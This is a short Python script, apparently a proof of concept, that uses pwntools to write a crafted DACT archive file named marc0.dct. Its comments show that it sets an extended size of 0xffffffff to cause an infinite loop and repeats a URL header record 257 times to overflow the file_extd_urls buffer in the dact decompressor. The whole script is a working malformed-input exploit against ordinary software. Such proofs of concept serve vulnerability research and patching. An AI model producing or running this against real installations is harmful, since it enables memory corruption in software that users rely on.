from pwn import *

if __name__ == '__main__':

	payload = ""
	payload += "\x44\x43\x54\xc3"	# DACT_MAGIC_NUMBER
	payload += "\x00" 		# version[0] 
	payload += "\x08"		# version[1]
	payload += "\x2a"		# version[2]
	payload += "AAAAAAAA"		# filesize
	payload += "BBBB"		# blk_cnt
	payload += "CCCC"		# blksize_uncomp
	payload += "\x00"		# file_opts
	payload += "\xff\xff\xff\xff"	# file_extd_size -> for infinite while loop
	payload += "\x07"		# ch -> DACT_HDR_URL : 7
	payload += "\x00\x00"		# x
	payload += "\x07\x00\x00"*257	# (ch: 7, x: 0 )* 257 to get BOF in file_extd_urls

	f = open("marc0.dct", 'w')
	f.write(payload)
	f.close()	
